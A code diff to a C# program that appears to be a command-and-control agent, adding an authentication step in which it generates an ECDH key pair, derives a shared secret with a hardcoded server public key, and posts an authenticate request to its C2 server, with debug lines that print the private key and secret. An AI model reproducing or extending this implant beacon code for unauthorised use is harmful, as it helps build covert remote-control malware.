@@ -14,6 +14,7 @@ using Agent.Core.Utils.Encoding;
 using System.Runtime.Loader;
 using System.Xml.Linq;
 using System.Threading.Tasks;
+using Agent.Core.Utils;
 
 // #if TYPE_http
 AgentInformationService agentInformationService = new AgentInformationService();
@@ -40,6 +41,29 @@ if (agentInfo is not null)
     baseConfig.AgentId = agentInfo.AgentId ?? string.Empty;
 }
 
+var baseCommunicationService = new CommunicationService(baseConfig);
+
+var (privKey, pubKey) = ECDHUtils.GenerateECDHKeyPair();
+
+Console.WriteLine(JsonSerializer.Serialize(privKey));
+Console.WriteLine(JsonSerializer.Serialize(pubKey));
+
+var authRequest = new C2Request
+{
+    Reason = C2RequestReason.Authenticate,
+    AgentId = baseConfig.AgentId,
+    ConfigId = baseConfig.AgentConfigId,
+    Message = Convert.ToBase64String(pubKey)
+};
+
+byte[] peerPublicKey = Convert.FromBase64String("BFJWrGsCTB4Qz54xpLT2YKFCuycUyapLAxTroHBKi5d+P5wAp2JdXWBWkokZ9QGu150/d2esO9DLVHxjkA/+ddw=");
+byte[] sharedSecret = ECDHUtils.DeriveECDHSharedSecret(privKey, peerPublicKey);
+
+Console.WriteLine(JsonSerializer.Serialize(sharedSecret));
+
+var authResponse = baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(authRequest));
+Console.WriteLine("Auth response: " + authResponse.Result);
+
 // TEMP
 string jsonOutput = JsonSerializer.Serialize(baseConfig);
 
@@ -61,7 +85,6 @@ var registerRequest = new C2Request
 };
 
 // Init contact request
-var baseCommunicationService = new CommunicationService(baseConfig);
 var registrationResult = await baseCommunicationService.SimplePostAsync("/", JsonSerializer.Serialize(registerRequest));
 
 if (registrationResult is null)
